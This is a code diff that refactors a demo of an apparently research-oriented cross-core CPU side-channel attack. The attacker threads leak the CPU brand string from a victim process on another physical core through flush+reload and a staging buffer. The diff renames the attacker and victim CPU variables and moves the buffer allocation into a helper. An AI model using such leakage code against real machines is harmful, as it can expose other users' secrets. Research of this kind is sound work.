@@ -19,18 +19,17 @@ void set_up_victim(int segment) {
 int main(int argc, char **args) {
     printf("Demo 1: Observing the CPU Brand String from another physical core.\n\n");
     _page_size = getpagesize();
-    get_same_core_cpus(&reader_cpu, &writer_cpu);
-    offcore_cpu = reader_cpu + 1;
-    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu, offcore_cpu);
+    get_same_core_cpus(&attacker_cpu1, &attacker_cpu2);
+    offcore_cpu = attacker_cpu1 + 1;
+    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", attacker_cpu1, attacker_cpu2, offcore_cpu);
     fflush(stdout);
-    uint8_t *mem =
-            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
-                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
-    memset(mem, 0xFF, _page_size * 256);
+
+    uint8_t * mem = allocate_flush_reload_buffer();
+
     crosstalk_init(argc, args);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
     pid = fork();
-    if (!pid) victim_cpuid(0xABCDEF, writer_cpu);
+    if (!pid) victim_cpuid(0xABCDEF, attacker_cpu2);
     char staging_buffer[65];
     staging_buffer[64] = 0;
     memset(staging_buffer, '*', 64);
@@ -38,7 +37,7 @@ int main(int argc, char **args) {
     fflush(stdout);
     for (int l = 0; l < 3; l++) {
         set_up_victim(l);
-        set_processor_affinity(reader_cpu);
+        set_processor_affinity(attacker_cpu1);
         vector_read(mem, REPS, staging_buffer, 16*l, 16*(l+1), 0);
         kill(pid2, SIGKILL);
     }
